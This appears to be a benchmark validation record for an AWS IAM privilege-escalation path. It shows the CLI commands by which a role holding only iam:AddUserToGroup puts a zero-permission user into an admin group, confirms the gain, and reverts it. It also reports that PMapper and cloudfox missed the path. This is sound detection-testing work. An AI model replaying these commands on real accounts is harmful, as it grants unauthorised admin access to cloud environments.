# `privesc13-AddUserToGroup--role` — M by all tools, path confirmed real

- **Class:** `privesc` · **Category:** M by all tools (rubric §6, ≥3 confirmed)
- **Date validated:** 2026-08-31 · **Context:** `admin` (`user/iamadmin`)
- **Claim under test:** the principal can add a user (itself or one it controls)
  to an admin-carrying group via `iam:AddUserToGroup`, inheriting that group's
  privilege. Target group: `privesc-sre-group` (carries `iam:*`/`ec2:*`/`s3:*`).

## Commands and outcomes

Account ID redacted to `000000000000`. Exercised for real and reverted; group
membership is back to its original state. The user added was
`privesc-AssumeRole-start-user` (the otherwise-inert account), which makes the
escalation vivid: a zero-permission principal becomes admin.

```
# privesc13 managed policy body: { Allow iam:AddUserToGroup on * }

# group starts with one member
$ aws iam get-group --group-name privesc-sre-group --profile personal --query 'Users[].UserName'
[ "privesc-sre-user" ]

# assume privesc13 role
$ aws sts assume-role --role-arn arn:aws:iam::000000000000:role/privesc13-AddUserToGroup-role \
    --role-session-name p13val --profile personal
arn:aws:sts::000000000000:assumed-role/privesc13-AddUserToGroup-role/p13val

# THE PRIMITIVE: add the inert user to the admin group
$ aws iam add-user-to-group --group-name privesc-sre-group --user-name privesc-AssumeRole-start-user
ADD OK
$ aws iam get-group --group-name privesc-sre-group --profile personal --query 'Users[].UserName'
[ "privesc-AssumeRole-start-user", "privesc-sre-user" ]

# the newly-added user now has admin (via the group's privesc-sre-admin-policy):
$ aws iam simulate-principal-policy --profile personal \
    --policy-source-arn arn:aws:iam::000000000000:user/privesc-AssumeRole-start-user \
    --action-names iam:CreateUser iam:AttachUserPolicy
=> iam:CreateUser       : allowed
   iam:AttachUserPolicy : allowed

# privesc13 role can add but NOT remove (grant is AddUserToGroup only):
$ aws iam remove-user-from-group --group-name privesc-sre-group --user-name privesc-AssumeRole-start-user
An error occurred (AccessDenied) ... not authorized to perform: iam:RemoveUserFromGroup ...

# cleanup as iamadmin
$ aws iam remove-user-from-group --group-name privesc-sre-group \
    --user-name privesc-AssumeRole-start-user --profile personal
REMOVED
$ aws iam get-group --group-name privesc-sre-group --profile personal --query 'Users[].UserName'
[ "privesc-sre-user" ]
```

## Verdict

**Confirmed real.** `privesc13-AddUserToGroup-role` added a user to
`privesc-sre-group`; that user immediately gained `iam:CreateUser` /
`iam:AttachUserPolicy` (→ attach admin to self) through the group's
`iam:*`/`ec2:*`/`s3:*` policy. Membership was restored (removal required iamadmin,
since privesc13 grants add-only). The path works and the target group exists.

## Tool behaviour

- **PMapper (admin-flagged):** does **not** report privesc13 (absent from
  `query`/`analysis`). PMapper models group edges for permission resolution but did
  not surface `AddUserToGroup` as an escalation into the admin group.
- **cloudfox (admin-default):** `iam:AddUserToGroup` is **absent** from
  `iam-simulator` entirely (not in its fixed query set); it appears, if anywhere,
  only in the raw `permissions` dump bound to the principal.

**Genuine M by both tools on a working, target-present path** — a real detection
miss (not a target-absent case). This is one of the informative rows per rubric §2.
